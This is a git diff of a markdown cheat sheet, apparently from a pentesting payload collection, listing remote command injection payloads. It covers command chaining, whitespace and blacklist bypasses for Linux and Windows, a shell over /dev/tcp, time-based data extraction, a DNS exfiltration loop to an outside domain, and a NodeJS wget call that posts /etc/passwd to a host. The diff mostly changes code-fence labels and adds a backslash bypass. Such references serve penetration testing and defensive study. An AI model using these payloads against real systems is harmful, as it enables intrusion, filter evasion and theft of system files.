@@ -4,7 +4,7 @@ Remote Commands execution is a security vulnerability that allows an attacker to
 
 ## Exploits
 Normal Commands execution, execute the command and voila :p
-```
+```powershell
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -13,7 +13,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 ```
 
 Commands execution by chaining commands
-```
+```powershell
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
@@ -21,13 +21,13 @@ original_cmd_by_server || ls    Only if the first cmd fail
 ```
 
 Commands execution inside a command
-```
+```powershell
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```
 
 Commands execution without space - Linux
-```
+```powershell
 swissky@crashlab:~/Www$ cat</etc/passwd
 root:x:0:0:root:/root:/bin/bash
 
@@ -51,39 +51,44 @@ swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
 Commands execution without space - Windows
-```
+```powershell
 ping%CommonProgramFiles:~10,-18%IP
 ping%PROGRAMFILES:~10,-5%IP
 ```
 
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
-```
+```powershell
 IFS=,;`cat<<<uname,-a`
 ```
 
 Commands execution with a line return
-```
+```powershell
 something%0Acat%20/etc/passwd
 ```
 
 Bypass blacklisted word with single quote
-```
+```powershell
 w'h'o'am'i
 ```
 
 Bypass blacklisted word with double quote
-```
+```powershell
 w"h"o"am"i
 ```
 
-Bypass blacklisted word with $@
+Bypass blacklisted word with backslash
+```powershell
+w\ho\am\i 
 ```
+
+Bypass blacklisted word with $@
+```powershell
 who$@ami
 ```
 
 Bypass zsh/bash/sh blacklist
-```
+```powershell
 echo $0
 -> /usr/bin/zsh
 echo whoami|$0
@@ -92,7 +97,7 @@ echo whoami|$0
 
 ## Time based data exfiltration
 Extracting data : char by char
-```
+```powershell
 swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 real	0m5.007s
 user	0m0.000s
@@ -115,7 +120,7 @@ for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 
 ## Environment based
 NodeJS Commands execution
-```
+```powershell
 require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
 
